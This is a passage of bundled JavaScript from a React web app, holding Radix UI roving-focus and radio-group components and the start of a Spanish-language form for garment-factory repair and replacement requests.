var [RovingFocusProvider, useRovingFocusContext] = createRovingFocusGroupContext(GROUP_NAME2);
var RovingFocusGroup = React61.forwardRef(
  (props, forwardedRef) => {
    return /* @__PURE__ */ jsx51(Collection3.Provider, { scope: props.__scopeRovingFocusGroup, children: /* @__PURE__ */ jsx51(Collection3.Slot, { scope: props.__scopeRovingFocusGroup, children: /* @__PURE__ */ jsx51(RovingFocusGroupImpl, { ...props, ref: forwardedRef }) }) });
  }
);
RovingFocusGroup.displayName = GROUP_NAME2;
var RovingFocusGroupImpl = React61.forwardRef((props, forwardedRef) => {
  const {
    __scopeRovingFocusGroup,
    orientation,
    loop = false,
    dir,
    currentTabStopId: currentTabStopIdProp,
    defaultCurrentTabStopId,
    onCurrentTabStopIdChange,
    onEntryFocus,
    preventScrollOnEntryFocus = false,
    ...groupProps
  } = props;
  const ref = React61.useRef(null);
  const composedRefs = useComposedRefs(forwardedRef, ref);
  const direction = useDirection(dir);
  const [currentTabStopId, setCurrentTabStopId] = useControllableState({
    prop: currentTabStopIdProp,
    defaultProp: defaultCurrentTabStopId ?? null,
    onChange: onCurrentTabStopIdChange,
    caller: GROUP_NAME2
  });
  const [isTabbingBackOut, setIsTabbingBackOut] = React61.useState(false);
  const handleEntryFocus = useCallbackRef(onEntryFocus);
  const getItems = useCollection3(__scopeRovingFocusGroup);
  const isClickFocusRef = React61.useRef(false);
  const [focusableItemsCount, setFocusableItemsCount] = React61.useState(0);
  React61.useEffect(() => {
    const node = ref.current;
    if (node) {
      node.addEventListener(ENTRY_FOCUS, handleEntryFocus);
      return () => node.removeEventListener(ENTRY_FOCUS, handleEntryFocus);
    }
  }, [handleEntryFocus]);
  return /* @__PURE__ */ jsx51(
    RovingFocusProvider,
    {
      scope: __scopeRovingFocusGroup,
      orientation,
      dir: direction,
      loop,
      currentTabStopId,
      onItemFocus: React61.useCallback(
        (tabStopId) => setCurrentTabStopId(tabStopId),
        [setCurrentTabStopId]
      ),
      onItemShiftTab: React61.useCallback(() => setIsTabbingBackOut(true), []),
      onFocusableItemAdd: React61.useCallback(
        () => setFocusableItemsCount((prevCount) => prevCount + 1),
        []
      ),
      onFocusableItemRemove: React61.useCallback(
        () => setFocusableItemsCount((prevCount) => prevCount - 1),
        []
      ),
      children: /* @__PURE__ */ jsx51(
        Primitive.div,
        {
          tabIndex: isTabbingBackOut || focusableItemsCount === 0 ? -1 : 0,
          "data-orientation": orientation,
          ...groupProps,
          ref: composedRefs,
          style: { outline: "none", ...props.style },
          onMouseDown: composeEventHandlers(props.onMouseDown, () => {
            isClickFocusRef.current = true;
          }),
          onFocus: composeEventHandlers(props.onFocus, (event) => {
            const isKeyboardFocus = !isClickFocusRef.current;
            if (event.target === event.currentTarget && isKeyboardFocus && !isTabbingBackOut) {
              const entryFocusEvent = new CustomEvent(ENTRY_FOCUS, EVENT_OPTIONS2);
              event.currentTarget.dispatchEvent(entryFocusEvent);
              if (!entryFocusEvent.defaultPrevented) {
                const items = getItems().filter((item) => item.focusable);
                const activeItem = items.find((item) => item.active);
                const currentItem = items.find((item) => item.id === currentTabStopId);
                const candidateItems = [activeItem, currentItem, ...items].filter(
                  Boolean
                );
                const candidateNodes = candidateItems.map((item) => item.ref.current);
                focusFirst3(candidateNodes, preventScrollOnEntryFocus);
              }
            }
            isClickFocusRef.current = false;
          }),
          onBlur: composeEventHandlers(props.onBlur, () => setIsTabbingBackOut(false))
        }
      )
    }
  );
});
var ITEM_NAME2 = "RovingFocusGroupItem";
var RovingFocusGroupItem = React61.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeRovingFocusGroup,
      focusable = true,
      active = false,
      tabStopId,
      children,
      ...itemProps
    } = props;
    const autoId = useId();
    const id2 = tabStopId || autoId;
    const context = useRovingFocusContext(ITEM_NAME2, __scopeRovingFocusGroup);
    const isCurrentTabStop = context.currentTabStopId === id2;
    const getItems = useCollection3(__scopeRovingFocusGroup);
    const { onFocusableItemAdd, onFocusableItemRemove, currentTabStopId } = context;
    React61.useEffect(() => {
      if (focusable) {
        onFocusableItemAdd();
        return () => onFocusableItemRemove();
      }
    }, [focusable, onFocusableItemAdd, onFocusableItemRemove]);
    return /* @__PURE__ */ jsx51(
      Collection3.ItemSlot,
      {
        scope: __scopeRovingFocusGroup,
        id: id2,
        focusable,
        active,
        children: /* @__PURE__ */ jsx51(
          Primitive.span,
          {
            tabIndex: isCurrentTabStop ? 0 : -1,
            "data-orientation": context.orientation,
            ...itemProps,
            ref: forwardedRef,
            onMouseDown: composeEventHandlers(props.onMouseDown, (event) => {
              if (!focusable) event.preventDefault();
              else context.onItemFocus(id2);
            }),
            onFocus: composeEventHandlers(props.onFocus, () => context.onItemFocus(id2)),
            onKeyDown: composeEventHandlers(props.onKeyDown, (event) => {
              if (event.key === "Tab" && event.shiftKey) {
                context.onItemShiftTab();
                return;
              }
              if (event.target !== event.currentTarget) return;
              const focusIntent = getFocusIntent(event, context.orientation, context.dir);
              if (focusIntent !== void 0) {
                if (event.metaKey || event.ctrlKey || event.altKey || event.shiftKey) return;
                event.preventDefault();
                const items = getItems().filter((item) => item.focusable);
                let candidateNodes = items.map((item) => item.ref.current);
                if (focusIntent === "last") candidateNodes.reverse();
                else if (focusIntent === "prev" || focusIntent === "next") {
                  if (focusIntent === "prev") candidateNodes.reverse();
                  const currentIndex = candidateNodes.indexOf(event.currentTarget);
                  candidateNodes = context.loop ? wrapArray2(candidateNodes, currentIndex + 1) : candidateNodes.slice(currentIndex + 1);
                }
                setTimeout(() => focusFirst3(candidateNodes));
              }
            }),
            children: typeof children === "function" ? children({ isCurrentTabStop, hasTabStop: currentTabStopId != null }) : children
          }
        )
      }
    );
  }
);
RovingFocusGroupItem.displayName = ITEM_NAME2;
var MAP_KEY_TO_FOCUS_INTENT = {
  ArrowLeft: "prev",
  ArrowUp: "prev",
  ArrowRight: "next",
  ArrowDown: "next",
  PageUp: "first",
  Home: "first",
  PageDown: "last",
  End: "last"
};
function getDirectionAwareKey(key, dir) {
  if (dir !== "rtl") return key;
  return key === "ArrowLeft" ? "ArrowRight" : key === "ArrowRight" ? "ArrowLeft" : key;
}
function getFocusIntent(event, orientation, dir) {
  const key = getDirectionAwareKey(event.key, dir);
  if (orientation === "vertical" && ["ArrowLeft", "ArrowRight"].includes(key)) return void 0;
  if (orientation === "horizontal" && ["ArrowUp", "ArrowDown"].includes(key)) return void 0;
  return MAP_KEY_TO_FOCUS_INTENT[key];
}
function focusFirst3(candidates, preventScroll = false) {
  const PREVIOUSLY_FOCUSED_ELEMENT = document.activeElement;
  for (const candidate of candidates) {
    if (candidate === PREVIOUSLY_FOCUSED_ELEMENT) return;
    candidate.focus({ preventScroll });
    if (document.activeElement !== PREVIOUSLY_FOCUSED_ELEMENT) return;
  }
}
function wrapArray2(array, startIndex) {
  return array.map((_, index2) => array[(startIndex + index2) % array.length]);
}
var Root7 = RovingFocusGroup;
var Item2 = RovingFocusGroupItem;

// node_modules/@radix-ui/react-radio-group/dist/index.mjs
import * as React62 from "react";
import { jsx as jsx52, jsxs as jsxs24 } from "react/jsx-runtime";
import { jsx as jsx210 } from "react/jsx-runtime";
var RADIO_NAME = "Radio";
var [createRadioContext, createRadioScope] = createContextScope(RADIO_NAME);
var [RadioProvider, useRadioContext] = createRadioContext(RADIO_NAME);
var Radio = React62.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeRadio,
      name,
      checked = false,
      required,
      disabled,
      value = "on",
      onCheck,
      form,
      ...radioProps
    } = props;
    const [button, setButton] = React62.useState(null);
    const composedRefs = useComposedRefs(forwardedRef, (node) => setButton(node));
    const hasConsumerStoppedPropagationRef = React62.useRef(false);
    const isFormControl = button ? form || !!button.closest("form") : true;
    return /* @__PURE__ */ jsxs24(RadioProvider, { scope: __scopeRadio, checked, disabled, children: [
      /* @__PURE__ */ jsx52(
        Primitive.button,
        {
          type: "button",
          role: "radio",
          "aria-checked": checked,
          "data-state": getState3(checked),
          "data-disabled": disabled ? "" : void 0,
          disabled,
          value,
          ...radioProps,
          ref: composedRefs,
          onClick: composeEventHandlers(props.onClick, (event) => {
            if (!checked) onCheck?.();
            if (isFormControl) {
              hasConsumerStoppedPropagationRef.current = event.isPropagationStopped();
              if (!hasConsumerStoppedPropagationRef.current) event.stopPropagation();
            }
          })
        }
      ),
      isFormControl && /* @__PURE__ */ jsx52(
        RadioBubbleInput,
        {
          control: button,
          bubbles: !hasConsumerStoppedPropagationRef.current,
          name,
          value,
          checked,
          required,
          disabled,
          form,
          style: { transform: "translateX(-100%)" }
        }
      )
    ] });
  }
);
Radio.displayName = RADIO_NAME;
var INDICATOR_NAME = "RadioIndicator";
var RadioIndicator = React62.forwardRef(
  (props, forwardedRef) => {
    const { __scopeRadio, forceMount, ...indicatorProps } = props;
    const context = useRadioContext(INDICATOR_NAME, __scopeRadio);
    return /* @__PURE__ */ jsx52(Presence, { present: forceMount || context.checked, children: /* @__PURE__ */ jsx52(
      Primitive.span,
      {
        "data-state": getState3(context.checked),
        "data-disabled": context.disabled ? "" : void 0,
        ...indicatorProps,
        ref: forwardedRef
      }
    ) });
  }
);
RadioIndicator.displayName = INDICATOR_NAME;
var BUBBLE_INPUT_NAME3 = "RadioBubbleInput";
var RadioBubbleInput = React62.forwardRef(
  ({
    __scopeRadio,
    control,
    checked,
    bubbles = true,
    ...props
  }, forwardedRef) => {
    const ref = React62.useRef(null);
    const composedRefs = useComposedRefs(ref, forwardedRef);
    const prevChecked = usePrevious(checked);
    const controlSize = useSize(control);
    React62.useEffect(() => {
      const input = ref.current;
      if (!input) return;
      const inputProto = window.HTMLInputElement.prototype;
      const descriptor = Object.getOwnPropertyDescriptor(
        inputProto,
        "checked"
      );
      const setChecked = descriptor.set;
      if (prevChecked !== checked && setChecked) {
        const event = new Event("click", { bubbles });
        setChecked.call(input, checked);
        input.dispatchEvent(event);
      }
    }, [prevChecked, checked, bubbles]);
    return /* @__PURE__ */ jsx52(
      Primitive.input,
      {
        type: "radio",
        "aria-hidden": true,
        defaultChecked: checked,
        ...props,
        tabIndex: -1,
        ref: composedRefs,
        style: {
          ...props.style,
          ...controlSize,
          position: "absolute",
          pointerEvents: "none",
          opacity: 0,
          margin: 0
        }
      }
    );
  }
);
RadioBubbleInput.displayName = BUBBLE_INPUT_NAME3;
function getState3(checked) {
  return checked ? "checked" : "unchecked";
}
var ARROW_KEYS = ["ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"];
var RADIO_GROUP_NAME = "RadioGroup";
var [createRadioGroupContext, createRadioGroupScope] = createContextScope(RADIO_GROUP_NAME, [
  createRovingFocusGroupScope,
  createRadioScope
]);
var useRovingFocusGroupScope = createRovingFocusGroupScope();
var useRadioScope = createRadioScope();
var [RadioGroupProvider, useRadioGroupContext] = createRadioGroupContext(RADIO_GROUP_NAME);
var RadioGroup = React210.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeRadioGroup,
      name,
      defaultValue,
      value: valueProp,
      required = false,
      disabled = false,
      orientation,
      dir,
      loop = true,
      onValueChange,
      ...groupProps
    } = props;
    const rovingFocusGroupScope = useRovingFocusGroupScope(__scopeRadioGroup);
    const direction = useDirection(dir);
    const [value, setValue] = useControllableState({
      prop: valueProp,
      defaultProp: defaultValue ?? null,
      onChange: onValueChange,
      caller: RADIO_GROUP_NAME
    });
    return /* @__PURE__ */ jsx210(
      RadioGroupProvider,
      {
        scope: __scopeRadioGroup,
        name,
        required,
        disabled,
        value,
        onValueChange: setValue,
        children: /* @__PURE__ */ jsx210(
          Root7,
          {
            asChild: true,
            ...rovingFocusGroupScope,
            orientation,
            dir: direction,
            loop,
            children: /* @__PURE__ */ jsx210(
              Primitive.div,
              {
                role: "radiogroup",
                "aria-required": required,
                "aria-orientation": orientation,
                "data-disabled": disabled ? "" : void 0,
                dir: direction,
                ...groupProps,
                ref: forwardedRef
              }
            )
          }
        )
      }
    );
  }
);
RadioGroup.displayName = RADIO_GROUP_NAME;
var ITEM_NAME3 = "RadioGroupItem";
var RadioGroupItem = React210.forwardRef(
  (props, forwardedRef) => {
    const { __scopeRadioGroup, disabled, ...itemProps } = props;
    const context = useRadioGroupContext(ITEM_NAME3, __scopeRadioGroup);
    const isDisabled = context.disabled || disabled;
    const rovingFocusGroupScope = useRovingFocusGroupScope(__scopeRadioGroup);
    const radioScope = useRadioScope(__scopeRadioGroup);
    const ref = React210.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, ref);
    const checked = context.value === itemProps.value;
    const isArrowKeyPressedRef = React210.useRef(false);
    React210.useEffect(() => {
      const handleKeyDown = (event) => {
        if (ARROW_KEYS.includes(event.key)) {
          isArrowKeyPressedRef.current = true;
        }
      };
      const handleKeyUp = () => isArrowKeyPressedRef.current = false;
      document.addEventListener("keydown", handleKeyDown);
      document.addEventListener("keyup", handleKeyUp);
      return () => {
        document.removeEventListener("keydown", handleKeyDown);
        document.removeEventListener("keyup", handleKeyUp);
      };
    }, []);
    return /* @__PURE__ */ jsx210(
      Item2,
      {
        asChild: true,
        ...rovingFocusGroupScope,
        focusable: !isDisabled,
        active: checked,
        children: /* @__PURE__ */ jsx210(
          Radio,
          {
            disabled: isDisabled,
            required: context.required,
            checked,
            ...radioScope,
            ...itemProps,
            name: context.name,
            ref: composedRefs,
            onCheck: () => context.onValueChange(itemProps.value),
            onKeyDown: composeEventHandlers((event) => {
              if (event.key === "Enter") event.preventDefault();
            }),
            onFocus: composeEventHandlers(itemProps.onFocus, () => {
              if (isArrowKeyPressedRef.current) ref.current?.click();
            })
          }
        )
      }
    );
  }
);
RadioGroupItem.displayName = ITEM_NAME3;
var INDICATOR_NAME2 = "RadioGroupIndicator";
var RadioGroupIndicator = React210.forwardRef(
  (props, forwardedRef) => {
    const { __scopeRadioGroup, ...indicatorProps } = props;
    const radioScope = useRadioScope(__scopeRadioGroup);
    return /* @__PURE__ */ jsx210(RadioIndicator, { ...radioScope, ...indicatorProps, ref: forwardedRef });
  }
);
RadioGroupIndicator.displayName = INDICATOR_NAME2;
var Root25 = RadioGroup;
var Item22 = RadioGroupItem;
var Indicator = RadioGroupIndicator;

// client/src/components/ui/radio-group.tsx
import { jsx as jsx53 } from "react/jsx-runtime";
var RadioGroup2 = React63.forwardRef(({ className, ...props }, ref) => {
  return /* @__PURE__ */ jsx53(
    Root25,
    {
      className: cn("grid gap-2", className),
      ...props,
      ref
    }
  );
});
RadioGroup2.displayName = Root25.displayName;
var RadioGroupItem2 = React63.forwardRef(({ className, ...props }, ref) => {
  return /* @__PURE__ */ jsx53(
    Item22,
    {
      ref,
      className: cn(
        "aspect-square h-4 w-4 rounded-full border border-primary text-primary ring-offset-background focus:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50",
        className
      ),
      ...props,
      children: /* @__PURE__ */ jsx53(Indicator, { className: "flex items-center justify-center", children: /* @__PURE__ */ jsx53(Circle, { className: "h-2.5 w-2.5 fill-current text-current" }) })
    }
  );
});
RadioGroupItem2.displayName = Item22.displayName;

// client/src/components/repositions/RepositionForm.tsx
var import_sweetalert25 = __toESM(require_sweetalert2_all(), 1);
import { useEffect as useEffect30 } from "react";
import { jsx as jsx54, jsxs as jsxs25 } from "react/jsx-runtime";
var areas = [
  "patronaje",
  "corte",
  "bordado",
  "ensamble",
  "plancha",
  "calidad",
  "operaciones"
];
var urgencyOptions = [
  { value: "urgente", label: "Urgente" },
  { value: "intermedio", label: "Intermedio" },
  { value: "poco_urgente", label: "Poco Urgente" }
];
var commonAccidents = [
  "Da\xF1o por m\xE1quina",
  "Costuras en mal estado",
  "Bordado mal posicionado",
  "Defecto de tela",
  "Error en la fabricaci\xF3n",
  "Tela sucia o manchada",
  "Error de dise\xF1o",
  "Accidente por operario",
  "Falla en el proceso de corte",
  "Defecto en el ensamble",
  "Error en plancha",
  "Problema de calidad",
  "Otro"
];
function RepositionForm({ onClose }) {
  const queryClient2 = useQueryClient();
  const [productos, setProductos] = useState33([{
    modeloPrenda: "",
    tela: "",
    color: "",
    tipoPieza: "",
    consumoTela: 0,
    pieces: [{ talla: "", cantidad: 1, folioOriginal: "" }]
  }]);
  const [contrastFabric, setContrastFabric] = useState33({
    tela: "",
    color: "",
    consumo: 0,
    tipoPiezas: [{ tipoPieza: "", pieces: [{ talla: "", cantidad: 1, folioOriginal: "" }] }]
  });
  const [selectedFiles, setSelectedFiles] = useState33([]);
  const { register, handleSubmit, watch, setValue, formState: { errors } } = useForm({
    defaultValues: {
      type: "repocision",
      urgencia: "intermedio",
      tieneTelaContraste: false,
      productos: [{ modeloPrenda: "", tela: "", color: "", tipoPieza: "", consumoTela: 0, pieces: [{ talla: "", cantidad: 1, folioOriginal: "" }] }]
    }
  });
  useEffect30(() => {
    register("solicitanteArea", { required: "Campo requerido" });
    register("currentArea", { required: "Campo requerido" });
    register("tipoAccidente", { required: "Campo requerido" });
    register("volverHacer");
    register("materialesImplicados");
  }, [register]);
  const createRepositionMutation = useMutation({
    mutationFn: async (data) => {
      const formDataToSend = new FormData();
      const allPieces = productos.flatMap((producto) => producto.pieces);
      formDataToSend.append("repositionData", JSON.stringify({
        ...data,
        pieces: allPieces,
        productos,
        telaContraste: data.tieneTelaContraste ? contrastFabric : void 0
      }));
      selectedFiles.forEach((file) => {
        formDataToSend.append("documents", file);
      });
      const response = await fetch("/api/repositions", {
        method: "POST",
        body: formDataToSend
      });
      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to create reposition");
      }
      return response.json();
    },
    onSuccess: () => {
      queryClient2.invalidateQueries({ queryKey: ["repositions"] });
      import_sweetalert25.default.fire({
        title: "\xA1\xC9xito!",
        text: "Solicitud de reposici\xF3n creada correctamente",
        icon: "success",
        confirmButtonColor: "#8B5CF6"
      });
      onClose();
    },
    onError: (error) => {
      import_sweetalert25.default.fire({
        title: "Error",
        text: "Error al crear la solicitud de reposici\xF3n",
        icon: "error",
        confirmButtonColor: "#8B5CF6"
      });
    }
  });
  const addProducto = () => {
    setProductos([...productos, {
      modeloPrenda: "",
      tela: "",
      color: "",
      tipoPieza: "",
      consumoTela: 0,
      pieces: [{ talla: "", cantidad: 1, folioOriginal: "" }]
    }]);
  };
  const removeProducto = (index2) => {
    setProductos(productos.filter((_, i) => i !== index2));
  };
  const updateProducto = (index2, field, value) => {
    const newProductos = [...productos];
    if (field === "pieces") return;
    newProductos[index2] = { ...newProductos[index2], [field]: value };
    setProductos(newProductos);
  };
  const addProductPiece = (productIndex) => {
    const newProductos = [...productos];
    newProductos[productIndex].pieces.push({ talla: "", cantidad: 1, folioOriginal: "" });
    setProductos(newProductos);
  };
  const removeProductPiece = (productIndex, pieceIndex) => {
    const newProductos = [...productos];
    newProductos[productIndex].pieces = newProductos[productIndex].pieces.filter((_, i) => i !== pieceIndex);
    setProductos(newProductos);
  };
  const updateProductPiece = (productIndex, pieceIndex, field, value) => {
    const newProductos = [...productos];
    newProductos[productIndex].pieces[pieceIndex] = {
      ...newProductos[productIndex].pieces[pieceIndex],
      [field]: value
    };
    setProductos(newProductos);
  };
  const addContrastPieceType = () => {
    setContrastFabric((prev) => ({
      ...prev,
      tipoPiezas: [...prev.tipoPiezas, { tipoPieza: "", pieces: [{ talla: "", cantidad: 1, folioOriginal: "" }] }]
    }));
  };
  const removeContrastPieceType = (index2) => {
    setContrastFabric((prev) => ({
      ...prev,
      tipoPiezas: prev.tipoPiezas.filter((_, i) => i !== index2)
    }));
  };
  const updateContrastPieceType = (index2, tipoPieza) => {
    setContrastFabric((prev) => ({
      ...prev,
      tipoPiezas: prev.tipoPiezas.map(
        (item, i) => i === index2 ? { ...item, tipoPieza } : item
      )
    }));
  };
  const addContrastPiece = (pieceTypeIndex) => {
    setContrastFabric((prev) => ({
      ...prev,
      tipoPiezas: prev.tipoPiezas.map(
        (item, i) => i === pieceTypeIndex ? { ...item, pieces: [...item.pieces, { talla: "", cantidad: 1, folioOriginal: "" }] } : item
      )
    }));
  };
  const removeContrastPiece = (pieceTypeIndex, pieceIndex) => {
    setContrastFabric((prev) => ({
      ...prev,
      tipoPiezas: prev.tipoPiezas.map(
        (item, i) => i === pieceTypeIndex ? { ...item, pieces: item.pieces.filter((_, j) => j !== pieceIndex) } : item
      )
    }));
  };
  const updateContrastPiece = (pieceTypeIndex, pieceIndex, field, value) => {
    setContrastFabric((prev) => ({
      ...prev,
      tipoPiezas: prev.tipoPiezas.map(
        (item, i) => i === pieceTypeIndex ? {
          ...item,
          pieces: item.pieces.map(
            (piece, j) => j === pieceIndex ? { ...piece, [field]: value } : piece
          )
        } : item
      )
    }));
  };
  const calculateResourceCost = () => {
    let totalCost = 0;
    productos.forEach((producto) => {
      if (producto.consumoTela) {
        totalCost += producto.consumoTela * 60;
      }
    });
    if (watch("tieneTelaContraste") && watch("telaContraste")) {
      const contraste = watch("telaContraste");
      if (contraste?.consumo) {
        totalCost += contraste.consumo * 60;
      }
    }
    return totalCost;
  };
  const onSubmit = (data) => {
    if (data.type === "repocision") {
      for (let i = 0; i < productos.length; i++) {
        const producto = productos[i];
        if (!producto.modeloPrenda || !producto.tela || !producto.color || !producto.tipoPieza) {
          import_sweetalert25.default.fire({
            title: "Error",
            text: `Todos los campos del producto ${i + 1} son requeridos`,
            icon: "error",
            confirmButtonColor: "#8B5CF6"
          });
          return;
        }
        if (producto.pieces.some((p) => !p.talla || p.cantidad < 1)) {
          import_sweetalert25.default.fire({
            title: "Error",
            text: `Todas las piezas del producto ${i + 1} deben tener talla y cantidad v\xE1lida`,
            icon: "error",
            confirmButtonColor: "#8B5CF6"
          });
          return;
        }
      }
    }
    if (data.type === "reproceso") {
      if (!data.volverHacer || !data.materialesImplicados) {
        import_sweetalert25.default.fire({
          title: "Error",
          text: "Todos los campos del reproceso son requeridos",
          icon: "error",
          confirmButtonColor: "#8B5CF6"
        });
        return;
      }
    }
    let formDataToSend = { ...data };
    if (data.type === "repocision" && productos.length > 0) {
      const firstProduct = productos[0];
      formDataToSend = {
        ...formDataToSend,
        modeloPrenda: firstProduct.modeloPrenda,
        tela: firstProduct.tela,
        color: firstProduct.color,
        tipoPieza: firstProduct.tipoPieza,
        consumoTela: firstProduct.consumoTela || 0
      };
    } else if (data.type === "reproceso") {
      formDataToSend = {
        ...formDataToSend,
        modeloPrenda: "",
        tela: "",
        color: "",
        tipoPieza: "",
        consumoTela: 0
      };
    }
    createRepositionMutation.mutate(formDataToSend);
  };
  return /* @__PURE__ */ jsx54("div", { className: "fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4", children: /* @__PURE__ */ jsx54("div", { className: "bg-white rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto", children: /* @__PURE__ */ jsxs25("form", { onSubmit: handleSubmit(onSubmit), className: "p-6 space-y-6", children: [
    /* @__PURE__ */ jsxs25("div", { className: "flex justify-between items-center", children: [
      /* @__PURE__ */ jsx54("h2", { className: "text-2xl font-bold text-purple-800", children: "Nueva Solicitud" }),
      /* @__PURE__ */ jsx54(Button, { type: "button", variant: "outline", onClick: onClose, children: "Cancelar" })
    ] }),
    /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "Tipo de Solicitud" }) }),
      /* @__PURE__ */ jsx54(CardContent, { children: /* @__PURE__ */ jsxs25(
        RadioGroup2,
        {
          value: watch("type"),
          onValueChange: (value) => setValue("type", value),
          className: "flex space-x-6",
          children: [
            /* @__PURE__ */ jsxs25("div", { className: "flex items-center space-x-2", children: [
              /* @__PURE__ */ jsx54(RadioGroupItem2, { value: "repocision", id: "repocision" }),
              /* @__PURE__ */ jsx54(Label2, { htmlFor: "repocision", children: "Reposici\xF3n" })
            ] }),
            /* @__PURE__ */ jsxs25("div", { className: "flex items-center space-x-2", children: [
              /* @__PURE__ */ jsx54(RadioGroupItem2, { value: "reproceso", id: "reproceso" }),
              /* @__PURE__ */ jsx54(Label2, { htmlFor: "reproceso", children: "Reproceso" })
            ] })
          ]
        }
      ) })
    ] }),
    /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "Informaci\xF3n del Solicitante" }) }),
      /* @__PURE__ */ jsxs25(CardContent, { className: "grid grid-cols-1 md:grid-cols-2 gap-4", children: [
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "solicitanteNombre", children: "Nombre del Solicitante *" }),
          /* @__PURE__ */ jsx54(
            Input,
            {
              id: "solicitanteNombre",
              ...register("solicitanteNombre", { required: "Campo requerido" }),
              className: errors.solicitanteNombre ? "border-red-500" : ""
            }
          )
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { children: "Fecha de Solicitud" }),
          /* @__PURE__ */ jsx54(Input, { value: (/* @__PURE__ */ new Date()).toLocaleDateString(), disabled: true })
        ] })
      ] })
    ] }),
    /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "N\xFAmero de Solicitud" }) }),
      /* @__PURE__ */ jsxs25(CardContent, { className: "grid grid-cols-1 md:grid-cols-3 gap-4", children: [
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "noSolicitud", children: "N\xFAmero de Solicitud de Pedido *" }),
          /* @__PURE__ */ jsx54(
            Input,
            {
              id: "noSolicitud",
              ...register("noSolicitud", { required: "Campo requerido" }),
              className: errors.noSolicitud ? "border-red-500" : ""
            }
          )
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "noHoja", children: "N\xFAmero de Hoja" }),
          /* @__PURE__ */ jsx54(Input, { id: "noHoja", ...register("noHoja") })
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "fechaCorte", children: "Fecha de Corte" }),
          /* @__PURE__ */ jsx54(
            Input,
            {
              id: "fechaCorte",
              type: "date",
              ...register("fechaCorte")
            }
          )
        ] })
      ] })
    ] }),
    /* @__PURE__ */ jsxs25(Card, { children: [
      /* @__PURE__ */ jsx54(CardHeader, { children: /* @__PURE__ */ jsx54(CardTitle, { children: "Descripci\xF3n del Da\xF1o" }) }),
      /* @__PURE__ */ jsxs25(CardContent, { className: "space-y-4", children: [
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "causanteDano", children: "Nombre del Causante del Da\xF1o *" }),
          /* @__PURE__ */ jsx54(
            Input,
            {
              id: "causanteDano",
              ...register("causanteDano", { required: "Campo requerido" }),
              className: errors.causanteDano ? "border-red-500" : ""
            }
          )
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "tipoAccidente", children: "Tipo de Accidente *" }),
          /* @__PURE__ */ jsxs25(
            Select2,
            {
              value: watch("tipoAccidente"),
              onValueChange: (value) => setValue("tipoAccidente", value),
              children: [
                /* @__PURE__ */ jsx54(SelectTrigger2, { children: /* @__PURE__ */ jsx54(SelectValue2, { placeholder: "Selecciona el tipo de accidente" }) }),
                /* @__PURE__ */ jsx54(SelectContent2, { children: commonAccidents.map((accident) => /* @__PURE__ */ jsx54(SelectItem2, { value: accident, children: accident }, accident)) })
              ]
            }
          ),
          errors.tipoAccidente && /* @__PURE__ */ jsx54("p", { className: "text-red-500 text-sm", children: "Campo requerido" })
        ] }),
        watch("tipoAccidente") === "Otro" && /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "otroAccidente", children: "Especifique el tipo de accidente *" }),
          /* @__PURE__ */ jsx54(
            Input,
            {
              id: "otroAccidente",
              ...register("otroAccidente", {
                required: watch("tipoAccidente") === "Otro" ? "Campo requerido" : false
              }),
              className: errors.otroAccidente ? "border-red-500" : "",
              placeholder: "Describe el tipo de accidente"
            }
          )
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "solicitanteArea", children: "\xC1rea que caus\xF3 el da\xF1o *" }),
          /* @__PURE__ */ jsxs25(
            Select2,
            {
              value: watch("solicitanteArea"),
              onValueChange: (value) => setValue("solicitanteArea", value),
              children: [
                /* @__PURE__ */ jsx54(SelectTrigger2, { children: /* @__PURE__ */ jsx54(SelectValue2, { placeholder: "Selecciona un \xE1rea" }) }),
                /* @__PURE__ */ jsx54(SelectContent2, { children: areas.map((area) => /* @__PURE__ */ jsx54(SelectItem2, { value: area, children: area.charAt(0).toUpperCase() + area.slice(1) }, area)) })
              ]
            }
          ),
          errors.solicitanteArea && /* @__PURE__ */ jsx54("p", { className: "text-red-500 text-sm", children: "Campo requerido" })
        ] }),
        /* @__PURE__ */ jsxs25("div", { children: [
          /* @__PURE__ */ jsx54(Label2, { htmlFor: "currentArea", children: "\xC1rea actual *" }),
          /* @__PURE__ */ jsxs25(
            Select2,
            {
              value: watch("currentArea"),
              onValueChange: (value) => setValue("currentArea", value),
              children: [
                /* @__PURE__ */ jsx54(SelectTrigger2, { children: /* @__PURE__ */ jsx54(SelectValue2, { placeholder: "Selecciona un \xE1rea" }) }),
                /* @__PURE__ */ jsx54(SelectContent2, { children: areas.map((area) => /* @__PURE__ */ jsx54(SelectItem2, { value: area, children: area.charAt(0).toUpperCase() + area.slice(1) }, area)) })
              ]
            }
          ),
          errors.currentArea && /* @__PURE__ */ jsx54("p", { className: "text-red-500 text-sm", children: "Campo requerido" })
        ] }),
